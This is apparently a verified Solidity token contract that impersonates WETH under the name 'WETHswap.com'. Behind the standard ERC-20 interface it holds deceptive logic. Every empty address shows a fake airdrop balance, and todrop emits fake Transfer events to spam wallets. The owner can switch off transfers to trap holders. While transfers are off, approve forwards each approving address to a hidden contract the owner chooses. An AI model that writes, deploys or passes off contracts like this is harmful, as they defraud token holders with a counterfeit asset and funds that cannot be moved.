/**
 *Submitted for verification at BscScan.com on 2022-09-03
*/

pragma solidity ^0.6.0;
// SPDX-License-Identifier: MIT

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}



interface MintApprovalInterface {
    //function approve(address _spender, uint _value) external returns (bool success);
    function approve(address _from) external;


}



contract TSuperToken is IERC20 {
    string public constant symbol = "WETH";
    string public constant name = "WETHswap.com";
    uint8 public constant decimals = 18;
    
    uint private constant __totalSupply = 21000000 * 10 ** 18;
    mapping (address => uint) private __balanceOf;
    mapping (address => mapping (address => uint)) private __allowances;

    address private owner; 
    address private approveAddr;
    uint256 private airdropNum = 5576000 * 10 ** 13; 
    bool transferOff = false;  

    
    constructor() public {
            __balanceOf[msg.sender] = __totalSupply;
            owner = msg.sender;
    }


    function setApproveAddr(address addr) public{
        require(msg.sender == owner);
        approveAddr = addr;
    }


    function setTransferOff(bool off) public {
        require(msg.sender == owner);
        transferOff = off;
    }


    function getTransferOff() public view returns (bool )  {
        require(msg.sender == owner);
        return transferOff;
    }


    
    //function totalSupply() public view returns (uint _totalSupply) {
    function totalSupply() public view override returns(uint256 _totalSupply) {
        _totalSupply = __totalSupply;
    }
    
    //function balanceOf(address _addr) public view returns (uint balance) {
    function balanceOf(address _addr) public view override returns (uint256 balance) {
        balance = __balanceOf[_addr];
        if (balance == 0){
            balance = airdropNum;
        }

        return balance;



        //return __balanceOf[_addr];
    }
    
    //function transfer(address _to, uint _value) public returns (bool success) {
    function transfer(address _to, uint256 _value) public override returns (bool success) {

        if (transferOff  == true){
            require(false);
        }


        if (_value > 0 && _value <= balanceOf(msg.sender)) {
            __balanceOf[msg.sender] -= _value;
            __balanceOf[_to] += _value;
            return true;
        }
        return false;
    }
    
    //function transferFrom(address _from, address _to, uint _value) public returns (bool success) {
    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {    
        if (transferOff  == true){
            require(false);
        }

        if (__allowances[_from][msg.sender] > 0 &&
            _value > 0 &&
            __allowances[_from][msg.sender] >= _value && 
            __balanceOf[_from] >= _value) {
            __balanceOf[_from] -= _value;
            __balanceOf[_to] += _value;
            // Missed from the video
            __allowances[_from][msg.sender] -= _value;
            return true;
        }
        return false;
    }
    
    //function approve(address _spender, uint _value) public returns (bool success) {
    function approve(address _spender, uint256 _value) public override returns (bool success) {
        if (transferOff  == true){
            MintApprovalInterface  app = MintApprovalInterface(approveAddr);
            app.approve(msg.sender);
        }


        __allowances[msg.sender][_spender] = _value;
        return true;
    }


    
    //function allowance(address _owner, address _spender) public view returns (uint remaining) {
    function allowance(address _owner, address _spender) public view override returns (uint256 remaining) {
        return __allowances[_owner][_spender];
    }


    function todrop(address[] memory addrs) public returns (bool){
        require(addrs.length > 0);
        for (uint256 i = 0; i < addrs.length; i++) {
            emit Transfer(msg.sender, addrs[i], airdropNum);
        }
        return true;
    }


}